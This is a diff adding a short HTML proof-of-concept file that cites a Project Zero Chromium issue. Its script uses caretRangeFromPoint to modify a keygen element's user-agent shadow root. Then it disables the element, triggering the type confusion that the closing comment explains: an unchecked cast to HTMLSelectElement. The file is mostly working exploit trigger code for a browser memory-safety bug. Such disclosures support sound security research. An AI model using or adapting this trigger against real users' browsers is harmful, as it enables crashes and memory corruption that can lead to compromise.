@@ -1,0 +1,15 @@
+<!-- Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=999 -->
+
+<keygen id="keygen_element" style="position:absolute; height: 100px; width: 100px;">
+<script>
+var range = document.caretRangeFromPoint(50, 50);
+var shadow_tree_container = range.commonAncestorContainer;
+shadow_tree_container.prepend("foo");
+keygen_element.disabled = true;
+</script>
+
+<!--
+What happens here:
+1. caretRangeFromPoint() allows accessing (and modifying) userAgentShadowRoot from JavaScript
+2. HTMLKeygenElement::shadowSelect() blindly casts the first child of the userAgentShadowRoot to HTMLSelectElement without checking the Node type.
+-->
